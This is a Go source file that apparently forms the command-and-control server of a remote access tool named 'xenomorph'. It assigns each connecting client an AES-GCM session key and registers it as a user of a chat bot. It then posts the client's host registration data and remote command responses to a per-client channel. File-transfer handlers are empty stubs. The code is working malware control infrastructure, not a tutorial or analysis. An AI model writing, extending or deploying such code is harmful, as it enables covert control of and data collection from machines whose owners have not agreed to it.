package netserver

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/codevault-llc/xenomorph/internal/bot"
	"github.com/codevault-llc/xenomorph/internal/bot/embeds"
	"github.com/codevault-llc/xenomorph/internal/secure"
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"github.com/codevault-llc/xenomorph/pkg/utils"
	"go.uber.org/zap"
)

type Session struct {
	ID   string
	Conn net.Conn
	Sec  *secure.Sec
	Addr string
	registry *Registry
}

func NewSession(conn net.Conn, registry *Registry) *Session {
	sessionInstance := &Session{
		ID:   "", // Empty until set by the client's connect message
		Conn: conn,
		Sec:  secure.New(),
		Addr: conn.RemoteAddr().String(),
		registry: registry,
	}

	return sessionInstance
}

func (s *Session) Handle() error {
	defer func() {
    logger.L().Info("Client disconnected", zap.String("id", s.ID), zap.String("addr", s.Addr))
    s.registry.Unregister(s.ID)
    s.Conn.Close()

		if r := recover(); r != nil {
			logger.L().Error("Session handling panic", zap.Any("recover", r), zap.String("id", s.ID), zap.String("addr", s.Addr))
		}
	}()

	logger.L().Info("Client connected", zap.String("id", s.ID), zap.String("addr", s.Addr))

	for {
		msgType, _, msgID, payload, err := s.Read()
		if err != nil {
			logger.L().Error("Failed to read message", zap.Error(err))

			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.L().Info("Connection closed by client", zap.String("address", s.Addr))
				s.registry.Unregister(s.ID)
				s.Conn.Close()
				return nil
			}

			if netErr, ok := err.(net.Error); ok && netErr.Temporary() {
				logger.L().Warn("Temporary error reading message", zap.Error(err), zap.String("address", s.Addr))
				continue
			}

			logger.L().Error("Error reading message", zap.Error(err), zap.String("address", s.Addr))

			return err
		}

		switch msgType {
		case types.MsgConnect:
			logger.L().Info("Client wants to connect", zap.ByteString("payload", payload))
			if len(payload) == 0 {
				logger.L().Error("Received empty payload for MsgConnect", zap.String("address", s.Addr))
				continue
			}

			if len(payload) != 36 {
				logger.L().Error("Received invalid UUID length for MsgConnect", zap.String("address", s.Addr), zap.Int("length", len(payload)))
				continue
			}

	    s.ID = string(payload)
			
			if existingSession, _ := s.registry.Get(s.ID); existingSession != nil {
				logger.L().Info("Client already registered", zap.String("uuid", s.ID), zap.String("address", s.Addr))

				s.registry.Update(s)
				s.Send(types.MsgAck, 0, msgID, []byte("ACK"))
				continue
			}

			key, err := s.Sec.GenerateKey()
			if err != nil {
				return err
			}
			
			s.registry.Register(s)
			err = bot.GetBot().GenerateUser(s.ID)
			if err != nil {
				logger.L().Error("Failed to generate user", zap.Error(err), zap.String("uuid", s.ID))
				return err
			}

			handshakePayload := types.HandshakePayload{
				Encryption: "aes-gcm",
				Key: key,
			}

			handshakeData, err := json.Marshal(handshakePayload)
			if err != nil {
				logger.L().Error("Failed to marshal handshake payload", zap.Error(err))
				return err
			}

			if err := s.Send(types.MsgHandshake, 0, msgID, handshakeData); err != nil {
				logger.L().Error("Failed to send handshake message", zap.Error(err))
				return err
			}

			s.Sec.InitFromRawKey(key) // Initialize the secure connection with the provided key

		case types.MsgRegistration:
			if !json.Valid(payload) {
				logger.L().Error("Invalid handshake payload", zap.ByteString("payload", payload))
				return fmt.Errorf("invalid handshake payload")
			}

			var reg types.RegistrationData
			if err := json.Unmarshal(payload, &reg); err != nil {
				logger.L().Error("Invalid registration", zap.Error(err), zap.ByteString("payload", payload))
				return err
			}
			logger.L().Info("Client registered", zap.Any("info", reg))

			embed := embeds.ConnectionEmbed(&reg)
			bot.GetBot().SendEmbedToChannel(
				bot.GetBot().GetChannelFromUser(s.ID, "info"),
				"",
				&embed,
			)

		case types.MsgPing:
			logger.L().Debug("Received ping")
			s.Send(types.MsgAck, 0, msgID, []byte("PONG"))

		case types.MsgCommandResponse:
			if len(payload) == 0 {
				logger.L().Error("Received empty payload for MsgCommandResponse", zap.String("address", s.Addr))
				continue
			}

			var response types.CommandResponse
			if err := json.Unmarshal(payload, &response); err != nil {
				logger.L().Error("Failed to unmarshal command response", zap.Error(err), zap.ByteString("payload", payload))
				return err
			}

			registryCommand, err := s.registry.GetCommand(response.ID)
			if err != nil {
				logger.L().Error("Failed to get command from registry", zap.Error(err), zap.String("commandID", response.ID))
				return err
			}

			currentTime := time.Now()
			previousTimestamp := registryCommand.Timestamp

			previousTime := time.Unix(0, previousTimestamp)
			duration := currentTime.Sub(previousTime)

			channel := bot.GetBot().GetChannelFromUser(s.ID, "info")
			bot.GetBot().SendEmbedToChannel(channel, "", embeds.CommandResponseEmbed(&response, duration))

		case types.MsgFileStart:

		case types.MsgFileChunk:
		
		case types.MsgFileEnd:
			

		default:
			logger.L().Warn("Unknown message type", zap.Uint8("type", msgType))
		}
	}
}

func (s *Session) Read() (byte, byte, uint32, []byte, error) {
	header := make([]byte, 10)
	if _, err := s.Conn.Read(header); err != nil {
		return 0, 0, 0, nil, err
	}

	totalLen := binary.BigEndian.Uint32(header[0:])
	msgType := header[4]
	flags := header[5]
	msgID := binary.BigEndian.Uint32(header[6:])

	payload := make([]byte, totalLen-10)
	if _, err := s.Conn.Read(payload); err != nil {
		logger.L().Error("Failed to read payload", zap.Error(err), zap.Uint32("msgID", msgID))
		return 0, 0, 0, nil, err
	}

	if flags&0x1 != 0 {
		decompressed, err := utils.Decompress(payload)
		if err != nil {
			return 0, 0, 0, nil, err
		}
		payload = decompressed
	}

	if s.Sec != nil {
		decrypted, err := s.Sec.Decrypt(payload)
		if err != nil {
			return 0, 0, 0, nil, err
		}
		payload = decrypted
	}

	return msgType, flags, msgID, payload, nil
}

func (s *Session) Send(msgType byte, flags byte, msgID uint32, payload []byte) error {
	if s.Sec != nil {
		var err error
		payload, err = s.Sec.Encrypt(payload)
		if err != nil {
			return fmt.Errorf("encryption failed: %w", err)
		}
	}

	if flags&0x1 != 0 {
		payload = utils.Compress(payload)
	}

	totalLen := 10 + len(payload)
	header := make([]byte, 10)
	binary.BigEndian.PutUint32(header[0:], uint32(totalLen))
	header[4] = msgType
	header[5] = flags
	binary.BigEndian.PutUint32(header[6:], msgID)

	if _, err := s.Conn.Write(header); err != nil {
		return err
	}

	if _, err := s.Conn.Write(payload); err != nil {
		return err
	}

	return nil
}

func (s *Session) GetSessionId() string {
	if s == nil {
		return ""
	}

	return s.ID
}